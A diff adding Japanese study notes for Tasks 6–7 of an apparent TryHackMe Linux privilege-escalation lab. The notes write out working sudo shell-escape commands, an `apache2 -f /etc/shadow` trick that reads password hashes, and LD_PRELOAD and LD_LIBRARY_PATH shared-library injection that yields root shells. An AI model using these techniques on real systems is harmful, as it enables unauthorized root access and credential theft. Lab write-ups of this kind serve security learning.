@@ -2,7 +2,7 @@
 
 > **ルーム:** [Linux PrivEsc](https://tryhackme.com/room/linprivesc)
 > **学習日:** 2026-05-24 〜
-> **進捗:** Task 1〜5 完了（24%）
+> **進捗:** Task 1〜7 完了（33%）
 > **初期認証情報:** `user:password321`（SSH接続可）
 
 ---
@@ -326,9 +326,141 @@ id
 
 ---
 
+## Task 6: Sudo - Shell Escape Sequences
+
+### 概要
+
+`sudo -l` で一般ユーザーがsudo経由で実行できるプログラムを列挙し、GTFOBinsでシェルエスケープシーケンスを調べてroot権限を奪取する。
+
+### 手順
+
+```bash
+# ターゲットマシン（user@debian）上で実行
+
+# sudo で実行可能なプログラムを列挙
+sudo -l
+# → 複数のプログラムがリストされる（vin, nano, awk, find など）
+```
+
+GTFOBins（https://gtfobins.github.io）でリストされた各プログラムを検索し、"sudo" 機能のエントリがあるものはシェルエスケープが可能。
+
+**シェルエスケープの例（find の場合）:**
+
+```bash
+sudo find . -exec /bin/sh \; -quit
+# → rootシェルが起動する
+```
+
+作業が終わったら必ず `exit` で一般ユーザーに戻る。
+
+### apache2 のケース：GTFOBins に載っていないプログラムの悪用
+
+リストの中で **apache2 だけ** は GTFOBins にシェルエスケープシーケンスが掲載されていない。しかし、載っていない = 安全ではない。
+
+#### アプローチ1：設定ファイル解析エラーを使ったファイル読み取り
+
+```bash
+sudo apache2 -f /etc/shadow
+```
+
+Apacheはroot権限で `/etc/shadow` を読み込もうとするが、中身がApache設定構文ではないため構文エラーを吐く。その際、**ファイルの内容（パスワードハッシュ）をエラーメッセージとして出力してしまう**。シェルは取れなくても情報窃取が成立する。
+
+#### アプローチ2：悪意ある共有ライブラリのモジュール注入
+
+Apacheは `LoadModule` で外部 `.so` ファイルを動的ロードできる仕様を持つ。この仕様を利用し、「ロードされた瞬間にroot権限でバックドアを作成するC言語コード」を `.so` にコンパイルし、ダミー設定ファイルで読み込ませる手法。Task 7 の LD_LIBRARY_PATH 悪用と本質的に同じ発想。
+
+### 教訓
+
+GTFOBinsはチートシートであって、「載っていないから安全」という意味ではない。「このバイナリはOS上でどういう権限と機能を持っているか」を論理的に分解すれば突破口は見える。
+
+---
+
+## Task 7: Sudo - Environment Variables
+
+### 概要
+
+`sudo` は特定の環境変数をユーザーの環境から引き継ぐよう設定できる。  
+`LD_PRELOAD` と `LD_LIBRARY_PATH` を引き継ぐ設定ミスを悪用し、プログラムのプロセス空間に悪意ある共有ライブラリを注入してroot権限を奪取する。
+
+### 仕組み（攻撃の本質）
+
+通常、`sudo` はセキュリティのためにユーザーの環境変数をすべてリセットする。しかし `sudo -l` で `env_keep+=LD_PRELOAD` や `env_keep+=LD_LIBRARY_PATH` があれば、これらが root 実行時にも引き継がれる致命的な設定ミスだ。
+
+### 手順
+
+```bash
+# 設定を確認
+sudo -l
+# → env_keep += LD_PRELOAD, LD_LIBRARY_PATH が確認できる
+```
+
+#### 攻撃1：LD_PRELOAD（VIP横入り攻撃）
+
+LD_PRELOAD は「他のすべてのライブラリより先に指定した .so を強制ロード」する環境変数。
+
+```bash
+# 悪意ある共有ライブラリをコンパイル
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+
+# sudo で任意の許可プログラムを実行しながら偽ライブラリを横入りさせる
+sudo LD_PRELOAD=/tmp/preload.so find
+# → root シェル（root@debian:/home/user#）が起動する
+```
+
+何のプログラムを実行するかは無関係。プログラムより先に `preload.so` がrootとしてロードされるため、その時点でバックドアが発火する。
+
+#### 攻撃2：LD_LIBRARY_PATH（偽の標識攻撃）
+
+LD_LIBRARY_PATH は「共有ライブラリの探索先を指定フォルダに優先させる」環境変数。
+
+```bash
+# apache2 の依存ライブラリを調査
+ldd /usr/sbin/apache2
+# → libcrypt.so.1, libdl.so.2 など多数がリストされる
+
+# 依存ライブラリと同名の偽ライブラリを /tmp に配置
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+
+# /tmp を優先探索させて apache2 を起動
+sudo LD_LIBRARY_PATH=/tmp apache2
+# → 偽 libcrypt.so.1 がロードされ root シェルが起動する
+```
+
+Apacheが `libcrypt.so.1` を探した際、`/tmp` に同名の偽ライブラリがあるため騙されてロードする。偽ライブラリ内の初期化コード（`__attribute__((constructor))` で定義）が即座に発火し、rootシェルが起動する。
+
+### エクストラチャレンジ：別ライブラリ名に偽装した場合の検証
+
+`libcrypt.so.1` ではなく `libdl.so.2` に名前を変えて同じ攻撃を試みた。
+
+```bash
+gcc -o /tmp/libdl.so.2 -shared -fPIC /home/user/tools/sudo/library_path.c
+sudo LD_LIBRARY_PATH=/tmp apache2
+# → root シェルが起動（成功）
+```
+
+**なぜ別の名前でも成功したか：**
+
+`libdl.so.2` は `libapr-1.so.0`（Apacheのコア基盤ライブラリ）が起動直後に要求するライブラリだった。`libapr` が最初に `libdl` を探した際に `/tmp` の偽ライブラリを掴んでしまい、`__attribute__((constructor))` が発火してrootシェルが立ち上がった。
+
+**攻撃の成否を分ける条件：**
+
+| 状況 | 成否 |
+|-----|-----|
+| ターゲットライブラリが「起動直後」に読み込まれる | 成功（constructor が即発火） |
+| ターゲットライブラリが「特定機能呼び出し時」の遅延ロード | 失敗（Apacheが通常起動して終わる） |
+
+「どのライブラリなら発火するか」は ldd で依存関係を読み、Apacheのコア処理が最初に引き込むものを狙うのがセオリー。
+
+### 今回の最大の教訓：「現在地（プロセスの階層）」を失うな
+
+LD_PRELOAD で rootシェルに入った後、`exit` せずにそのまま LD_LIBRARY_PATH の検証コマンドを打つと「root の中でさらにrootシェルを重ねる」マトリョーシカ状態になる。  
+外見のプロンプトは同じ `root@debian:/home/user#` に見えるが、プロセスは多重にネストしている。検証が狂うため、各攻撃の後は必ず `exit` で一般ユーザー（`user@debian:~$`）まで戻ってから次の攻撃を仕掛けること。
+
+---
+
 ## 次回の予定
 
-Task 6: Sudo - Shell Escape Sequences から再開
+Task 8: Cron Jobs - File Permissions から再開
 
 ---
 
